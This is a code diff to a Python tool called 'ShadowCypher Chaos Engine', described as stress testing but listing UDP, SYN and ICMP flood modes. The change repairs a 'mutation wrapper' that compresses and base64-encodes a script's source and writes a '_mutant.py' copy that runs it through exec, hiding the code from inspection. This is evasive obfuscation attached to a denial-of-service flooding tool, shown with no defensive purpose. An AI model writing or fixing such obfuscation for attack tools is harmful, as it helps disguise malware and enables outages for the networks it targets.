@@ -3,6 +3,7 @@ ShadowCypher Chaos Engine — 2026 Network Stress Testing & Load Orchestration.
 Supports: UDP_FLUX, HTTP_SYN_FLOOD, ICMP_BURST.
 """
 
+import os
 import socket
 import random
 import threading
@@ -57,7 +58,8 @@ class ChaosEngine:
             original = f.read()
             
         # Recursive Mutation Wrapper
-        wrapper = f"import zlib,base64; exec(zlib.decompress(base64.b64decode({base64.b64encode(zlib.compress(original))})))"
+        b64_data = base64.b64encode(zlib.compress(original)).decode()
+        wrapper = f"import zlib,base64; exec(zlib.decompress(base64.b64decode('{b64_data}')))"
         
         mutant_path = path.replace(".py", "_mutant.py")
         with open(mutant_path, "w") as f:
